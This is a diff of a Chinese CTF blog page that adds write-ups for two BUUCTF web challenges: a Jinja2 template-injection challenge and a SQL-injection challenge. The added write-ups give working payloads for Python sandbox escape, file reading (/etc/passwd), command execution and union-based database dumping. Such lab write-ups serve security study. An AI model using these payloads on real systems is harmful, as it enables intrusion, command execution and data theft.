@@ -272,7 +272,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count word-count">3.4k</span>Reading time: <span class="post-count reading-time">16 min</span></span>
+                        <span>Word count: <span class="post-count word-count">4.2k</span>Reading time: <span class="post-count reading-time">20 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -773,6 +773,67 @@ height:50vh;
 </ul>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=1;cat$IFS$1`ls`</span><br></pre></td></tr></table></figure>
 
+<h3 id="BJDCTF-2nd-fake-google"><a href="#BJDCTF-2nd-fake-google" class="headerlink" title="[BJDCTF 2nd]fake google"></a>[BJDCTF 2nd]fake google</h3><ul>
+<li>进行查询发现提示，存在模版注入。</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geezudrk4bj30mf026dgb.jpg" alt="image-20200503091520476"></p>
+<ul>
+<li>方法一：使用工具<code>tplmap</code></li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1geezvsza02j30bc039755.jpg" alt="image-20200503091641573"></p>
+<ul>
+<li>方法二：手工注入</li>
+</ul>
+<ul>
+<li>函数解析</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__class__ 返回调用的参数类型</span><br><span class="line">__bases__ 返回类型列表</span><br><span class="line">__mro__ 此属性是在方法解析期间寻找基类时考虑的类元组</span><br><span class="line">__subclasses__() 返回object的子类</span><br><span class="line">__globals__ 函数会以字典类型返回当前位置的全部全局变量 与 func_globals 等价</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取基本类</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">[].__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">request.__class__.__mro__[<span class="number">8</span>] //针对jinjia2/flask为[<span class="number">9</span>]适用</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>获取基本类后继续向下获取基本类(object)的子类</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object.__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>找到重载过的<code>__init__</code>类(在获取初始化属性后，带wrapper的说明没有重载，寻找不带warpper的)</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[99].__init__</span><br><span class="line">&lt;slot wrapper &apos;__init__&apos; of &apos;object&apos; objects&gt;</span><br><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__</span><br><span class="line">&lt;unbound method WarningMessage.__init__&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>查看其引用<code>__builtins__</code></li>
+</ul>
+<p><code>builtins即是引用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以这里直接调用引用的模块</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;]</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里会返回dict类型，寻找keys中可用函数，直接调用即可，使用keys中的file以实现读取文件的功能</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;F://GetFlag.txt&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<p><strong>读写文件</strong></p>
+<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;/etc/passwd&#39;).read()  #将read() 修改为 write() 即为写文件</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__().index(file)</span><br><span class="line">40</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[40](&apos;/etc/passwd&apos;).read() #将read() 修改为 write() 即为写文件</span><br></pre></td></tr></table></figure>
+
+<p><strong>命令执行</strong></p>
+<p><code>&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__().index(warnings.catch_warnings)</span><br><span class="line">59</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__.keys().index(&apos;linecache&apos;)</span><br><span class="line">25</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__.keys().index(&apos;os&apos;)</span><br><span class="line">12</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;)</span><br><span class="line">144</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__.values()[12].__dict__.values()[144](&apos;whoami&apos;)</span><br><span class="line">root</span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;commands&apos;).getstatusoutput(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;id&apos;).read()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Payload:qaq?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[169].__init__.__globals__.__builtins__[%27eval%27](&quot;__import__(%27os%27).popen(%27cat%20/flag%27).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h3><ul>
+<li>根据报错发现替换了or、union、select、from、where为空，使用双写能绕过进行常规注入。</li>
+</ul>
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gef0rnwie2j3138067mzl.jpg" alt="image-20200503094718122"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">username=0%27+uniunionon+selselectect+1,database(),3%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(schema_name),3+frofromm+infoorrmation_schema. schemata%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(table_name),3+frofromm+infoorrmation_schema.tables+whewherere+table_schema=&quot;ctf&quot;%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(column_name),3+frofromm+infoorrmation_schema. columns+whewherere+table_name=&quot;Flag&quot;%23&amp;password=123</span><br><span class="line"></span><br><span class="line">username=0%27+uniunionon+selselectect+1,group_concat(flag),3+frofromm+ctf.Flag%23&amp;password=123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gef1emq1b3j30ml04wgny.jpg" alt="image-20200503100923946"></p>
 
     </article>
     <!-- license  -->
@@ -781,7 +842,7 @@ height:50vh;
             <p>Author：<a href="https://lethalo.github.io">Lethal</a>
             <p>原文链接：<a href="https://lethalo.github.io/2020/04/24/BUUCTF/">https://lethalo.github.io/2020/04/24/BUUCTF/</a>
             <p>发表日期：<a href="https://lethalo.github.io/2020/04/24/BUUCTF/">April 24th 2020, 11:22:38 pm</a>
-            <p>更新日期：<a href="https://lethalo.github.io/2020/04/24/BUUCTF/">May 2nd 2020, 9:28:24 pm</a>
+            <p>更新日期：<a href="https://lethalo.github.io/2020/04/24/BUUCTF/">May 3rd 2020, 10:18:18 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -906,7 +967,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">1.0.1.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网杯-2019-随便注"><span class="toc-number">1.0.2.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">1.0.3.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#护网杯-2018-easy-tornado"><span class="toc-number">1.0.4.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">1.0.5.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-EasySQL"><span class="toc-number">1.0.6.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-Havefun"><span class="toc-number">1.0.7.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">1.0.8.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-Secret-File"><span class="toc-number">1.0.9.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网杯-2019-高明的黑客"><span class="toc-number">1.0.10.</span> <span class="toc-text">[强网杯 2019]高明的黑客</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="toc-number">1.0.11.</span> <span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-Knife"><span class="toc-number">1.0.12.</span> <span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网鼎杯-2018-Fakebook"><span class="toc-number">1.0.13.</span> <span class="toc-text">[网鼎杯 2018]Fakebook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-PHP"><span class="toc-number">1.0.14.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-LoveSQL"><span class="toc-number">1.0.15.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-Http"><span class="toc-number">1.0.16.</span> <span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">1.0.17.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-WarmUp"><span class="toc-number">1.0.1.</span> <span class="toc-text">[HCTF 2018]WarmUp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网杯-2019-随便注"><span class="toc-number">1.0.2.</span> <span class="toc-text">[强网杯 2019]随便注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-EasySQL"><span class="toc-number">1.0.3.</span> <span class="toc-text">[SUCTF 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#护网杯-2018-easy-tornado"><span class="toc-number">1.0.4.</span> <span class="toc-text">[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HCTF-2018-admin"><span class="toc-number">1.0.5.</span> <span class="toc-text">[HCTF 2018]admin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-EasySQL"><span class="toc-number">1.0.6.</span> <span class="toc-text">[极客大挑战 2019]EasySQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-Havefun"><span class="toc-number">1.0.7.</span> <span class="toc-text">[极客大挑战 2019]Havefun</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SUCTF-2019-CheckIn"><span class="toc-number">1.0.8.</span> <span class="toc-text">[SUCTF 2019]CheckIn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-Secret-File"><span class="toc-number">1.0.9.</span> <span class="toc-text">[极客大挑战 2019]Secret File</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#强网杯-2019-高明的黑客"><span class="toc-number">1.0.10.</span> <span class="toc-text">[强网杯 2019]高明的黑客</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"><span class="toc-number">1.0.11.</span> <span class="toc-text">[CISCN2019 华北赛区 Day2 Web1]Hack World</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-Knife"><span class="toc-number">1.0.12.</span> <span class="toc-text">[极客大挑战 2019]Knife</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网鼎杯-2018-Fakebook"><span class="toc-number">1.0.13.</span> <span class="toc-text">[网鼎杯 2018]Fakebook</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-PHP"><span class="toc-number">1.0.14.</span> <span class="toc-text">[极客大挑战 2019]PHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-LoveSQL"><span class="toc-number">1.0.15.</span> <span class="toc-text">[极客大挑战 2019]LoveSQL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-Http"><span class="toc-number">1.0.16.</span> <span class="toc-text">[极客大挑战 2019]Http</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GXYCTF2019-Ping-Ping-Ping"><span class="toc-number">1.0.17.</span> <span class="toc-text">[GXYCTF2019]Ping Ping Ping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BJDCTF-2nd-fake-google"><span class="toc-number">1.0.18.</span> <span class="toc-text">[BJDCTF 2nd]fake google</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#极客大挑战-2019-BabySQL"><span class="toc-number">1.0.19.</span> <span class="toc-text">[极客大挑战 2019]BabySQL</span></a></li></ol></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1119,12 +1180,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/ciscn-wp/" >ciscn_wp</a>
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/iscc-writeup/" >iscc_writeup</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/iscc-writeup/" >iscc_writeup</a>
+            <span class="archive-post-date">05/30</span><a class="archive-post-title" href= "/2018/05/30/ciscn-wp/" >ciscn_wp</a>
         </li>
     
     
@@ -1167,19 +1228,19 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
+    
         <span class="sidebar-tag-name" data-tags="dfs,c++"><span class="iconfont-archer">&#xe606;</span>dfs,c++</span>
     
         <span class="sidebar-tag-name" data-tags="Writeup"><span class="iconfont-archer">&#xe606;</span>Writeup</span>
+    
+        <span class="sidebar-tag-name" data-tags="dfs"><span class="iconfont-archer">&#xe606;</span>dfs</span>
     
         <span class="sidebar-tag-name" data-tags="Reerse"><span class="iconfont-archer">&#xe606;</span>Reerse</span>
     
         <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
     
         <span class="sidebar-tag-name" data-tags="dfs,c语言"><span class="iconfont-archer">&#xe606;</span>dfs,c语言</span>
-    
-        <span class="sidebar-tag-name" data-tags="dfs"><span class="iconfont-archer">&#xe606;</span>dfs</span>
-    
-        <span class="sidebar-tag-name" data-tags="writeup"><span class="iconfont-archer">&#xe606;</span>writeup</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
